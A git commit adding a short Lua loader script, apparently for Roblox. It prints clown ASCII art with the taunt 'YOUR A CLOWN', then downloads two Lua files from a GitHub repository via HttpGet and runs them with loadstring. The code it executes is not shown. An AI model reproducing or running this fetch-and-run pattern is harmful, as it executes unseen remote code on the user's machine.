724e680dbc928e173ef873c2d7e1215d81a35ea8
Dev <79853619+devvedbydev@users.noreply.github.com>
2024-10-19 22:30:00 +0100

    Create SecondaryLoader.lua

---
+++ SecondaryLoader.lua
@@ -0,0 +1,24 @@
+local clownASCII = [[
+
+          )               (
+         / \  .-"""""-.  / \
+        (   \/ __   __ \/   )
+         )  ; / _\ /_ \ ;  (
+        (   |  / \ / \  |   )
+         \ (,  \0/_\0/  ,) /
+          \_|   /   \   |_/
+            | (_\___/_) |
+            .\ \ -.- / /.
+           {  \ `===' /  }
+          {    `.___.'    }
+           {             }
+            `"="="="="="`
+]]
+warn(clownASCII)
+warn(" YOUR A CLOWN ")
+print("______________")
+
+------------------------------------------------------------------------------
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/devvedbydev/Repo/refs/heads/main/Information.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/devvedbydev/Repo/refs/heads/main/Environment.lua"))()
